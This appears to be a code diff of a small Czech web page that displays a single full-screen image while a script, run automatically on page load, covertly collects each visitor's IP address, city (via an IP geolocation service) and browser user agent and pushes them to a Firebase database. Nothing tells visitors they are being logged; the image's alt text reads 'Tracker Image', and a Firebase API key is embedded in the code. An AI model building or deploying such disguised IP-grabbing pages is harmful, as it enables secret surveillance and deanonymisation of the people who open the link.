@@ -1,12 +1,24 @@
 <!DOCTYPE html>
 <html lang="cs">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>s33yuh</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>s33yuh</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%; background: black; display: flex; justify-content: center; align-items: center;
+  }
+  img {
+    max-width: 100vw; max-height: 100vh; object-fit: contain;
+  }
+</style>
+</head>
+<body>
+  <img src="https://i.postimg.cc/sDT2SQhG/B9-E00-A9-C-FC2-A-4-E03-8-BBE-82-FFB81-AA2-D7.jpg" alt="Tracker Image" />
+
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+    import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyB-RcliC7vlLVsR7arV0Z-Z2ywvFytvwOU",
@@ -20,60 +32,45 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
-    const visitsRef = ref(db, 'visits');
 
-    function getOS(userAgent) {
-      const ua = userAgent.toLowerCase();
-      if (ua.includes('iphone')) return 'iOS';
-      if (ua.includes('android')) return 'Android';
-      if (ua.includes('windows')) return 'Windows';
-      if (ua.includes('mac os')) return 'macOS';
-      if (ua.includes('linux')) return 'Linux';
-      return 'Neznámý';
-    }
-
-    function getDevice(userAgent) {
-      const ua = userAgent.toLowerCase();
-      if (ua.includes('iphone')) return 'iPhone';
-      if (ua.includes('ipad')) return 'iPad';
-      if (ua.includes('android') && ua.includes('mobile')) return 'Android Phone';
-      if (ua.includes('android')) return 'Android Tablet';
-      if (ua.includes('windows') || ua.includes('mac') || ua.includes('linux')) return 'Desktop';
-      return 'Neznámé';
-    }
-
-    async function getCity() {
+    async function getIP() {
       try {
-        const res = await fetch("https://ipapi.co/json/");
+        const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        return data.city || 'neuvedeno';
+        return data.ip || 'unknown';
       } catch {
-        return 'neuvedeno';
+        return 'unknown';
+      }
+    }
+
+    async function getCity(ip) {
+      try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        return data.city || 'unknown';
+      } catch {
+        return 'unknown';
       }
     }
 
     async function logVisit() {
-      const ipReq = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipReq.json();
-      const userAgent = navigator.userAgent;
-      const os = getOS(userAgent);
-      const device = getDevice(userAgent);
-      const city = await getCity();
-
-      push(visitsRef, {
-        ip: ipData.ip,
-        userAgent: userAgent,
-        os: os,
-        device: device,
-        city: city,
-        timestamp: Date.now()
+      const ip = await getIP();
+      const city = await getCity(ip);
+      const userAgent = navigator.userAgent || 'unknown';
+      const visitRef = ref(db, 'visits');
+      push(visitRef, {
+        ip,
+        city,
+        userAgent,
+        timestamp: serverTimestamp()
+      }).then(() => {
+        console.log('Visit logged with city:', city);
+      }).catch(e => {
+        console.error('Failed to log visit:', e);
       });
     }
 
     logVisit();
   </script>
-</head>
-<body style="background:black;color:white;font-family:monospace;text-align:center;padding-top:20vh">
-  <h1>s33yuh</h1>
 </body>
 </html>
